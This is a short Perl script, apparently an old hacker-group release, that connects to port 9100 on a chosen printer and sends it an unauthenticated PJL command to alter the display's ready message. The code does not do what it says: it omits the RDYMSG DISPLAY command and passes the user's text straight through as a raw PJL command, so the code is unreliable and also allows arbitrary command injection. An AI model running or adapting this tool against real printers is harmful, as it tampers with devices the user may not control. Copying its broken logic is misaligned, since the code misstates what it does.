#!/usr/bin/perl
#
# Printer Fun :-)
# by Laurens (laurens@netric.org)
#
# little perl script to change the "ready message"
# on printers that support PJL commands.
#
# tested on a HP 4000/4100
#

use strict;
use IO::Socket;
use Getopt::Std;

my %opt;
my $data;
my $socket;

print "\nPrinter Fun :-)\n";
print "by Laurens (laurens\@netric.org)\n\n";

getopts("r:t:h", \%opt);
usage() if not %opt or $opt{h};

if ($opt{t} and $opt{r}) {
print "[+] Setting the printer ready message\n";

$data =
"\033%-12345X\@PJL $opt{r}\n".
"\033%-12345X\n";

$socket = IO::Socket::INET->new(
PeerAddr=>$opt{t},
PeerPort=>9100,
Proto =>'tcp')
or die "[-] Couldn't connect to $opt{t}:9100 : $!\n\n";

print $socket $data;
close ($socket);

print "[+] DONE!\n\n";
} else {
print "\n[-] Specify -r and -t!\n\n";
}

sub usage {
print "usage: $0 [-r <message>] [-t <hostname/ip>] [-h]\n";
print "-r : ready message display\n";
print "-t : target\n";
print "-h : help/usage\n";
print "example: $0 -r \"netric.org\" -t 192.168.1.123\n\n";
exit;
}
